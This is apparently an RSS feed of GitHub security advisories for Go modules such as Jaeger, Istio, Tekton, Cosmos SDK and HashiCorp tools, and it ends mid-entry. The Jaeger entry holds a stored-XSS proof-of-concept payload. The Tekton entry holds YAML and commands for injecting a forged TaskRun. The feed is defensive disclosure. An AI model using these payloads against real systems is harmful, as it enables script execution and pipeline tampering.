<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2023-07-12T18:01:42.928Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/malfunkt/iprange] iprange may panic when parsing ranges with invalid masks]]></title>
        <id>https://github.com/advisories/GHSA-f99h-w337-mv56</id>
        <link href="https://github.com/advisories/GHSA-f99h-w337-mv56"/>
        <updated>2023-07-12T17:29:24.000Z</updated>
        <content type="html"><![CDATA[<p>Parsing a range with a mask larger than 32 bits causes a panic.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/malfunkt/iprange/issues/1">https://github.com/malfunkt/iprange/issues/1</a></li>
<li><a href="https://github.com/advisories/GHSA-f99h-w337-mv56">https://github.com/advisories/GHSA-f99h-w337-mv56</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f99h-w337-mv56</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-12T17:29:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/jaegertracing/jaeger] A stored XSS in jaeger UI might allow an attacker who controls a trace to perform arbitrary jaeger queries]]></title>
        <id>https://github.com/advisories/GHSA-2w8w-qhg4-f78j</id>
        <link href="https://github.com/advisories/GHSA-2w8w-qhg4-f78j"/>
        <updated>2023-07-11T22:45:37.000Z</updated>
        <content type="html"><![CDATA[<p>Related UI vulnerability advisory: <a href="https://github.com/jaegertracing/jaeger-ui/security/advisories/GHSA-vv24-rm95-q56r">https://github.com/jaegertracing/jaeger-ui/security/advisories/GHSA-vv24-rm95-q56r</a></p>
<h3 id="summary">Summary</h3>
<p>Jaeger UI is using the <code>json-markup</code> dependency to display span attributes and resources. This dependency is not sanitising keys of an object though, thus the <code>KeyValuesTable</code> is vulnerable to XSS. </p>
<h3 id="details">Details</h3>
<p>The vulnerable line is here: <a href="https://github.com/jaegertracing/jaeger-ui/blob/main/packages/jaeger-ui/src/components/TracePage/TraceTimelineViewer/SpanDetail/KeyValuesTable.tsx#L49">https://github.com/jaegertracing/jaeger-ui/blob/main/packages/jaeger-ui/src/components/TracePage/TraceTimelineViewer/SpanDetail/KeyValuesTable.tsx#L49</a></p>
<h3 id="poc">PoC</h3>
<ol>
<li>Start a Jaeger UI</li>
<li>Save the following trace as a file:</li>
</ol>
<pre><code class="language-json">{
    "data": [
        {
            "traceID": "076ef819cc06c45a",
            "spans": [
                {
                    "traceID": "076ef819cc06c45a",
                    "spanID": "076ef819cc06c45a",
                    "flags": 1,
                    "operationName": "and open 'attributes'",
                    "references": [],
                    "startTime": 1678196149232010,
                    "duration": 13485,
                    "tags": [
                        {
                            "key": "sampler.type",
                            "type": "string",
                            "value": "{\"&lt;img src=x onerror=alert(1)&gt;\":\"test\"}"
                        }
                    ],
                    "logs": [],
                    "processID": "p1",
                    "warnings": null
                }
            ],
            "processes": {
                "p1": {
                    "serviceName": "click here",
                    "tags": [
                    ]
                }
            },
            "warnings": null
        }
    ],
    "total": 0,
    "limit": 0,
    "offset": 0,
    "errors": null
}
</code></pre>
<ol start="3">
<li>Upload that trace to Jaeger UI in order to visualise it.</li>
<li>Open the trace, open it's span's attributes.</li>
<li>XSS should be fired.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>This is a XSS on Jaeger UI. XSS can be used to run JavaScript.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jaegertracing/jaeger-ui/security/advisories/GHSA-vv24-rm95-q56r">https://github.com/jaegertracing/jaeger-ui/security/advisories/GHSA-vv24-rm95-q56r</a></li>
<li><a href="https://github.com/jaegertracing/jaeger/security/advisories/GHSA-2w8w-qhg4-f78j">https://github.com/jaegertracing/jaeger/security/advisories/GHSA-2w8w-qhg4-f78j</a></li>
<li><a href="https://github.com/jaegertracing/jaeger-ui/blob/main/packages/jaeger-ui/src/components/TracePage/TraceTimelineViewer/SpanDetail/KeyValuesTable.tsx#L49">https://github.com/jaegertracing/jaeger-ui/blob/main/packages/jaeger-ui/src/components/TracePage/TraceTimelineViewer/SpanDetail/KeyValuesTable.tsx#L49</a></li>
<li><a href="https://github.com/advisories/GHSA-2w8w-qhg4-f78j">https://github.com/advisories/GHSA-2w8w-qhg4-f78j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2w8w-qhg4-f78j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-11T22:45:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[istio.io/istio] Istio Authorization Bypass Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-6q5m-22mq-q2xv</id>
        <link href="https://github.com/advisories/GHSA-6q5m-22mq-q2xv"/>
        <updated>2023-07-11T16:53:42.000Z</updated>
        <content type="html"><![CDATA[<p>Istio before 1.8.6 and 1.9.x before 1.9.5 has a remotely exploitable vulnerability where an HTTP request path with multiple slashes or escaped slash characters (%2F or %5C) could potentially bypass an Istio authorization policy when path based authorization rules are used.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-31920">https://nvd.nist.gov/vuln/detail/CVE-2021-31920</a></li>
<li><a href="https://istio.io/latest/news/security/istio-security-2021-005/">https://istio.io/latest/news/security/istio-security-2021-005/</a></li>
<li><a href="https://github.com/advisories/GHSA-6q5m-22mq-q2xv">https://github.com/advisories/GHSA-6q5m-22mq-q2xv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6q5m-22mq-q2xv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-24T19:03:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[istio.io/istio] Istio Authorization Bypass Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-6q5m-22mq-q2xv</id>
        <link href="https://github.com/advisories/GHSA-6q5m-22mq-q2xv"/>
        <updated>2023-07-11T16:53:42.000Z</updated>
        <content type="html"><![CDATA[<p>Istio before 1.8.6 and 1.9.x before 1.9.5 has a remotely exploitable vulnerability where an HTTP request path with multiple slashes or escaped slash characters (%2F or %5C) could potentially bypass an Istio authorization policy when path based authorization rules are used.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-31920">https://nvd.nist.gov/vuln/detail/CVE-2021-31920</a></li>
<li><a href="https://istio.io/latest/news/security/istio-security-2021-005/">https://istio.io/latest/news/security/istio-security-2021-005/</a></li>
<li><a href="https://github.com/advisories/GHSA-6q5m-22mq-q2xv">https://github.com/advisories/GHSA-6q5m-22mq-q2xv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6q5m-22mq-q2xv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-24T19:03:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/rancher/rancher] Rancher XSS Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-6m8r-jh89-rq7h</id>
        <link href="https://github.com/advisories/GHSA-6m8r-jh89-rq7h"/>
        <updated>2023-07-10T23:48:12.000Z</updated>
        <content type="html"><![CDATA[<p>A Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in Rancher allows remote attackers to execute JavaScript via malicious links. This issue affects: SUSE Rancher Rancher versions prior to 2.5.6.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-25313">https://nvd.nist.gov/vuln/detail/CVE-2021-25313</a></li>
<li><a href="https://github.com/rancher/rancher/issues/31583">https://github.com/rancher/rancher/issues/31583</a></li>
<li><a href="https://bugzilla.suse.com/show_bug.cgi?id=1181852">https://bugzilla.suse.com/show_bug.cgi?id=1181852</a></li>
<li><a href="https://github.com/rancher/rancher/releases/tag/v2.5.6">https://github.com/rancher/rancher/releases/tag/v2.5.6</a></li>
<li><a href="https://github.com/advisories/GHSA-6m8r-jh89-rq7h">https://github.com/advisories/GHSA-6m8r-jh89-rq7h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6m8r-jh89-rq7h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-24T17:43:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/openark/orchestrator] openark/orchestrator cross-site scripting vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-752c-vfpf-cp2w</id>
        <link href="https://github.com/advisories/GHSA-752c-vfpf-cp2w"/>
        <updated>2023-07-10T23:44:01.000Z</updated>
        <content type="html"><![CDATA[<p>resources/public/js/orchestrator.js in openark orchestrator before 3.2.4 allows XSS via the orchestrator-msg parameter.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-27940">https://nvd.nist.gov/vuln/detail/CVE-2021-27940</a></li>
<li><a href="https://github.com/openark/orchestrator/pull/1313">https://github.com/openark/orchestrator/pull/1313</a></li>
<li><a href="https://github.com/openark/orchestrator/releases/tag/v3.2.4">https://github.com/openark/orchestrator/releases/tag/v3.2.4</a></li>
<li><a href="https://www.youtube.com/watch?v=DOYm0DIS3Us">https://www.youtube.com/watch?v=DOYm0DIS3Us</a></li>
<li><a href="https://github.com/openark/orchestrator/pull/1313/commits/76ceb6b0e013e1e815eb008dec90295860b06cf3">https://github.com/openark/orchestrator/pull/1313/commits/76ceb6b0e013e1e815eb008dec90295860b06cf3</a></li>
<li><a href="https://github.com/advisories/GHSA-752c-vfpf-cp2w">https://github.com/advisories/GHSA-752c-vfpf-cp2w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-752c-vfpf-cp2w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-24T22:01:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cloudreve/Cloudreve/v3] Cross site scripting in Cloudreve]]></title>
        <id>https://github.com/advisories/GHSA-fg25-gq9g-32mx</id>
        <link href="https://github.com/advisories/GHSA-fg25-gq9g-32mx"/>
        <updated>2023-07-07T22:17:22.000Z</updated>
        <content type="html"><![CDATA[<p>Cloudreve versions v1.0.0 through v3.5.3 are vulnerable to Stored Cross-Site Scripting (XSS), via the file upload functionality. A low privileged user will be able to share a file with an admin user, which could lead to privilege escalation.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-32167">https://nvd.nist.gov/vuln/detail/CVE-2022-32167</a></li>
<li><a href="https://www.mend.io/vulnerability-database/CVE-2022-32167">https://www.mend.io/vulnerability-database/CVE-2022-32167</a></li>
<li><a href="https://github.com/cloudreve/Cloudreve/commit/4b85541d73949969f41ad46d1e00544c9f1a7538">https://github.com/cloudreve/Cloudreve/commit/4b85541d73949969f41ad46d1e00544c9f1a7538</a></li>
<li><a href="https://github.com/cloudreve/Cloudreve/releases/tag/3.6.0-beta1">https://github.com/cloudreve/Cloudreve/releases/tag/3.6.0-beta1</a></li>
<li><a href="https://github.com/advisories/GHSA-fg25-gq9g-32mx">https://github.com/advisories/GHSA-fg25-gq9g-32mx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fg25-gq9g-32mx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-09-21T00:00:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cosmos/cosmos-sdk] Cosmos "Barberry" vulnerability in github.com/cosmos/cosmos-sdk]]></title>
        <id>https://github.com/advisories/GHSA-w44m-8mv2-v78h</id>
        <link href="https://github.com/advisories/GHSA-w44m-8mv2-v78h"/>
        <updated>2023-07-07T19:13:33.000Z</updated>
        <content type="html"><![CDATA[<p>The cosmos-sdk module is affected by the vulnerability codenamed "Barberry".</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cosmos/cosmos-sdk/pull/16466">https://github.com/cosmos/cosmos-sdk/pull/16466</a></li>
<li><a href="https://forum.cosmos.network/t/cosmos-sdk-security-advisory-barberry/10825">https://forum.cosmos.network/t/cosmos-sdk-security-advisory-barberry/10825</a></li>
<li><a href="https://github.com/advisories/GHSA-w44m-8mv2-v78h">https://github.com/advisories/GHSA-w44m-8mv2-v78h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w44m-8mv2-v78h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-06-22T20:01:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/tektoncd/pipeline] Pipelines do not validate child UIDs]]></title>
        <id>https://github.com/advisories/GHSA-w2h3-vvvq-3m53</id>
        <link href="https://github.com/advisories/GHSA-w2h3-vvvq-3m53"/>
        <updated>2023-07-07T18:46:19.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Pipelines do not validate child UIDs, which means that a user that has access to create TaskRuns can create their own Tasks that the Pipelines controller will accept as the child Task.</p>
<p>We should add UID to PipelineRun status and validate that child Run status/results only come from Runs matching the same UID. </p>
<h3 id="details">Details</h3>
<p>While we <a href="https://github.com/tektoncd/pipeline/blob/2d38f5fa840291395178422d34b36b1bc739e2a2/pkg/reconciler/pipelinerun/pipelinerun.go#L1358-L1372">store and validate the PipelineRun's (api version, kind, name, uid) in the child Run's OwnerReference</a>, we only store (api version, kind, name) in the <a href="https://pkg.go.dev/github.com/tektoncd/pipeline/pkg/apis/pipeline/v1beta1#ChildStatusReference">ChildStatusReference</a> .</p>
<p>This means that if a client had access to create TaskRuns on a cluster, they could create a child TaskRun for a pipeline with the same name + owner reference, and the Pipeline controller picks it up as if it was the original TaskRun. This is problematic since it can let users modify the config of Pipelines at runtime, which violates SLSA L2 Service Generated / Non-falsifiable requirements.</p>
<p>I believe this is also true for <a href="https://github.com/tektoncd/pipeline/blob/0b8349b770a76877051c9c790c94bf9ed897c75c/test/pipelinerun_test.go#L992">TaskRuns -&gt; Pods since it looks like we only lookup by name</a>, though I haven't tested this.</p>
<p>If you have update permissions on tekton resources, you could also perform a similar bypass like this (because it's difficult to distinguish this from a Task retry). For now, I think relying on RBAC is fine and treat update as a privileged role (though we should perhaps update docs to stress this). Create is the most problematic for now. SPIFFE/SPIRE might be able to help with ensuring that only the controller can modify state long term (e.g. sign the expected UIDs?)</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-yaml">apiVersion: [tekton.dev/v1beta1](http://tekton.dev/v1beta1)
kind: PipelineRun
metadata:
  name: hello-pr
spec:
  pipelineSpec:
    tasks:
      - name: task1
        taskSpec:
          steps:
            - name: echo
              image: [distroless.dev/alpine-base](http://distroless.dev/alpine-base)
              script: |
                sleep 60
      - name: task2
        runAfter: [task1]
        taskSpec:
          steps:
            - name: echo
              image: [distroless.dev/alpine-base](http://distroless.dev/alpine-base)
              script: |
                echo "asdf" &gt; $(results.foo.path)
          results:
            - name: foo
    results:
      - name: foo
        value: $(tasks.task2.results.foo)
</code></pre>
<p>Once this is running, grab the PR UID:</p>
<pre><code class="language-sh">$ k get pr hello-pr -o json | jq .metadata.uid -r
</code></pre>
<p>While pipeline is running task 1, start fake task 2:</p>
<pre><code class="language-yaml">apiVersion: [tekton.dev/v1beta1](http://tekton.dev/v1beta1)
kind: TaskRun
metadata:
  annotations:
  labels:
    [app.kubernetes.io/managed-by](http://app.kubernetes.io/managed-by): tekton-pipelines
    [tekton.dev/memberOf](http://tekton.dev/memberOf): tasks
    [tekton.dev/pipeline](http://tekton.dev/pipeline): hello-pr
    [tekton.dev/pipelineRun](http://tekton.dev/pipelineRun): hello-pr
    [tekton.dev/pipelineTask](http://tekton.dev/pipelineTask): task2
  name: hello-pr-task2
  namespace: default
  ownerReferences:
  - apiVersion: [tekton.dev/v1beta1](http://tekton.dev/v1beta1)
    blockOwnerDeletion: true
    controller: true
    kind: PipelineRun
    name: hello-pr
    uid: af549647-4532-468b-90c5-29122a408f8d &lt;--- this should be UID of PR fetched in last step
spec:
  serviceAccountName: default
  taskSpec:
    results:
    - name: foo
      type: string
    steps:
    - image: [distroless.dev/alpine-base](http://distroless.dev/alpine-base)
      name: echo
      resources: {}
      script: |
        echo "zxcv" &gt; $(results.foo.path)
</code></pre>
<p>Get pipeline results - it shows the output of the 2nd injected TaskRun</p>
<pre><code>$ k get pr -o json hello-pr | jq .status.pipelineResults
[
  {
    "name": "foo",
    "value": "zxcv\n"
  }
]
</code></pre>
<h3 id="impact">Impact</h3>
<p>This can be used to trick the Pipeline controller into associating unrelated Runs to the Pipeline, feeding its data through the rest of the Pipeline. This requires access to create TaskRuns, so impact may vary depending on your Tekton setup. <strong>If users already have unrestricted access to create any Task/PipelineRun, this does not grant any additional capabilities</strong>.</p>
<p>Worst case example would be a supply chain attack where a malicious TaskRun triggered from Triggers/Workflows intercepts and replaces a task in a trusted Pipeline.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tektoncd/pipeline/security/advisories/GHSA-w2h3-vvvq-3m53">https://github.com/tektoncd/pipeline/security/advisories/GHSA-w2h3-vvvq-3m53</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-37264">https://nvd.nist.gov/vuln/detail/CVE-2023-37264</a></li>
<li><a href="https://github.com/tektoncd/pipeline/blob/2d38f5fa840291395178422d34b36b1bc739e2a2/pkg/reconciler/pipelinerun/pipelinerun.go#L1358-L1372">https://github.com/tektoncd/pipeline/blob/2d38f5fa840291395178422d34b36b1bc739e2a2/pkg/reconciler/pipelinerun/pipelinerun.go#L1358-L1372</a></li>
<li><a href="https://pkg.go.dev/github.com/tektoncd/pipeline/pkg/apis/pipeline/v1beta1#ChildStatusReference">https://pkg.go.dev/github.com/tektoncd/pipeline/pkg/apis/pipeline/v1beta1#ChildStatusReference</a></li>
<li><a href="https://github.com/advisories/GHSA-w2h3-vvvq-3m53">https://github.com/advisories/GHSA-w2h3-vvvq-3m53</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w2h3-vvvq-3m53</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2023-07-07T18:46:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cosmos/cosmos-sdk] Barberry Security Advisory - regarding x/auth periodic vesting accounts]]></title>
        <id>https://github.com/advisories/GHSA-j2cr-jc39-wpx5</id>
        <link href="https://github.com/advisories/GHSA-j2cr-jc39-wpx5"/>
        <updated>2023-07-07T18:34:28.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In <code>PeriodicVestingAccount</code>, defined in <code>x/auth</code>, an attacker can initialize a victim's account as a malicious vesting account, which allows deposits but does not allow withdrawals. When the user then deposits funds into their account, those funds are locked forever, and the user is not able to withdraw them.</p>
<h3 id="patches">Patches</h3>
<p>&gt;= v0.46.13 for Cosmos SDK v0.46.x
&gt;= v0.47.3 for Cosmos SDK v0.47.x</p>
<p>If a network backported periodic vesting accounts to earlier versions of the SDK, those networks are affected too.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround for this issue. Upgrade immediately.</p>
<h3 id="references">References</h3>
<ul>
<li>Patched versions release notes: <a href="https://github.com/cosmos/cosmos-sdk/blob/cfc757dc5043fb2758c47c146d2912fd010c1a45/RELEASE_NOTES.md#cosmos-sdk-v0473-release-notes">v0.47.3</a>, <a href="https://github.com/cosmos/cosmos-sdk/blob/d4b7164de5d8391e6aa644d8ea84e07396dd9653/RELEASE_NOTES.md#cosmos-sdk-v04613-release-notes">v0.46.13</a>.</li>
<li><a href="https://forum.cosmos.network/t/cosmos-sdk-security-advisory-barberry/10825">Forum Post</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-j2cr-jc39-wpx5">https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-j2cr-jc39-wpx5</a></li>
<li><a href="https://forum.cosmos.network/t/cosmos-sdk-security-advisory-barberry/10825">https://forum.cosmos.network/t/cosmos-sdk-security-advisory-barberry/10825</a></li>
<li><a href="https://github.com/cosmos/cosmos-sdk/blob/cfc757dc5043fb2758c47c146d2912fd010c1a45/RELEASE_NOTES.md#cosmos-sdk-v0473-release-notes">https://github.com/cosmos/cosmos-sdk/blob/cfc757dc5043fb2758c47c146d2912fd010c1a45/RELEASE_NOTES.md#cosmos-sdk-v0473-release-notes</a></li>
<li><a href="https://github.com/cosmos/cosmos-sdk/blob/d4b7164de5d8391e6aa644d8ea84e07396dd9653/RELEASE_NOTES.md#cosmos-sdk-v04613-release-notes">https://github.com/cosmos/cosmos-sdk/blob/d4b7164de5d8391e6aa644d8ea84e07396dd9653/RELEASE_NOTES.md#cosmos-sdk-v04613-release-notes</a></li>
<li><a href="https://github.com/advisories/GHSA-j2cr-jc39-wpx5">https://github.com/advisories/GHSA-j2cr-jc39-wpx5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j2cr-jc39-wpx5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-07T18:34:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cosmos/cosmos-sdk] Barberry Security Advisory - regarding x/auth periodic vesting accounts]]></title>
        <id>https://github.com/advisories/GHSA-j2cr-jc39-wpx5</id>
        <link href="https://github.com/advisories/GHSA-j2cr-jc39-wpx5"/>
        <updated>2023-07-07T18:34:28.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In <code>PeriodicVestingAccount</code>, defined in <code>x/auth</code>, an attacker can initialize a victim's account as a malicious vesting account, which allows deposits but does not allow withdrawals. When the user then deposits funds into their account, those funds are locked forever, and the user is not able to withdraw them.</p>
<h3 id="patches">Patches</h3>
<p>&gt;= v0.46.13 for Cosmos SDK v0.46.x
&gt;= v0.47.3 for Cosmos SDK v0.47.x</p>
<p>If a network backported periodic vesting accounts to earlier versions of the SDK, those networks are affected too.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround for this issue. Upgrade immediately.</p>
<h3 id="references">References</h3>
<ul>
<li>Patched versions release notes: <a href="https://github.com/cosmos/cosmos-sdk/blob/cfc757dc5043fb2758c47c146d2912fd010c1a45/RELEASE_NOTES.md#cosmos-sdk-v0473-release-notes">v0.47.3</a>, <a href="https://github.com/cosmos/cosmos-sdk/blob/d4b7164de5d8391e6aa644d8ea84e07396dd9653/RELEASE_NOTES.md#cosmos-sdk-v04613-release-notes">v0.46.13</a>.</li>
<li><a href="https://forum.cosmos.network/t/cosmos-sdk-security-advisory-barberry/10825">Forum Post</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-j2cr-jc39-wpx5">https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-j2cr-jc39-wpx5</a></li>
<li><a href="https://forum.cosmos.network/t/cosmos-sdk-security-advisory-barberry/10825">https://forum.cosmos.network/t/cosmos-sdk-security-advisory-barberry/10825</a></li>
<li><a href="https://github.com/cosmos/cosmos-sdk/blob/cfc757dc5043fb2758c47c146d2912fd010c1a45/RELEASE_NOTES.md#cosmos-sdk-v0473-release-notes">https://github.com/cosmos/cosmos-sdk/blob/cfc757dc5043fb2758c47c146d2912fd010c1a45/RELEASE_NOTES.md#cosmos-sdk-v0473-release-notes</a></li>
<li><a href="https://github.com/cosmos/cosmos-sdk/blob/d4b7164de5d8391e6aa644d8ea84e07396dd9653/RELEASE_NOTES.md#cosmos-sdk-v04613-release-notes">https://github.com/cosmos/cosmos-sdk/blob/d4b7164de5d8391e6aa644d8ea84e07396dd9653/RELEASE_NOTES.md#cosmos-sdk-v04613-release-notes</a></li>
<li><a href="https://github.com/advisories/GHSA-j2cr-jc39-wpx5">https://github.com/advisories/GHSA-j2cr-jc39-wpx5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j2cr-jc39-wpx5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-07T18:34:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/nomad] Hashicorp Nomad ACLs Cannot Deny Access to Workload’s Own Variables]]></title>
        <id>https://github.com/advisories/GHSA-hhvx-8755-4cvw</id>
        <link href="https://github.com/advisories/GHSA-hhvx-8755-4cvw"/>
        <updated>2023-07-06T21:54:22.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was identified in Nomad and Nomad Enterprise (“Nomad”) such that a deny ACL capability could not be applied to a workload’s own variables. If included, the Nomad ACL system will silently fail to block access. This vulnerability, CVE-2023-1296, was fixed in Nomad 1.4.6 and 1.5.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-1296">https://nvd.nist.gov/vuln/detail/CVE-2023-1296</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2023-09-nomad-acls-can-not-deny-access-to-workloads-own-variables/51390">https://discuss.hashicorp.com/t/hcsec-2023-09-nomad-acls-can-not-deny-access-to-workloads-own-variables/51390</a></li>
<li><a href="https://github.com/advisories/GHSA-hhvx-8755-4cvw">https://github.com/advisories/GHSA-hhvx-8755-4cvw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hhvx-8755-4cvw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-06T19:24:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/nomad] Hashicorp Nomad ACLs Cannot Deny Access to Workload’s Own Variables]]></title>
        <id>https://github.com/advisories/GHSA-hhvx-8755-4cvw</id>
        <link href="https://github.com/advisories/GHSA-hhvx-8755-4cvw"/>
        <updated>2023-07-06T21:54:22.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was identified in Nomad and Nomad Enterprise (“Nomad”) such that a deny ACL capability could not be applied to a workload’s own variables. If included, the Nomad ACL system will silently fail to block access. This vulnerability, CVE-2023-1296, was fixed in Nomad 1.4.6 and 1.5.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-1296">https://nvd.nist.gov/vuln/detail/CVE-2023-1296</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2023-09-nomad-acls-can-not-deny-access-to-workloads-own-variables/51390">https://discuss.hashicorp.com/t/hcsec-2023-09-nomad-acls-can-not-deny-access-to-workloads-own-variables/51390</a></li>
<li><a href="https://github.com/advisories/GHSA-hhvx-8755-4cvw">https://github.com/advisories/GHSA-hhvx-8755-4cvw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hhvx-8755-4cvw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-06T19:24:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/vault] Hashicorp Vault Fails to Verify if Approle SecretID Belongs to Role During a Destroy Operation]]></title>
        <id>https://github.com/advisories/GHSA-wmg5-g953-qqfw</id>
        <link href="https://github.com/advisories/GHSA-wmg5-g953-qqfw"/>
        <updated>2023-07-06T21:51:18.000Z</updated>
        <content type="html"><![CDATA[<p>When using the Vault and Vault Enterprise (Vault) approle auth method, any authenticated user with access to the <code>/auth/approle/role/:role_name/secret-id-accessor/destroy</code> endpoint can destroy the secret ID of any other role by providing the secret ID accessor. This vulnerability, CVE-2023-24999, has been fixed in Vault 1.13.0, 1.12.4, 1.11.8, 1.10.11 and above.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-24999">https://nvd.nist.gov/vuln/detail/CVE-2023-24999</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2023-07-vault-fails-to-verify-if-approle-secretid-belongs-to-role-during-a-destroy-operation/51305">https://discuss.hashicorp.com/t/hcsec-2023-07-vault-fails-to-verify-if-approle-secretid-belongs-to-role-during-a-destroy-operation/51305</a></li>
<li><a href="https://github.com/advisories/GHSA-wmg5-g953-qqfw">https://github.com/advisories/GHSA-wmg5-g953-qqfw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wmg5-g953-qqfw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-07-06T19:24:11.000Z</published>
    </entry>
    <entry>
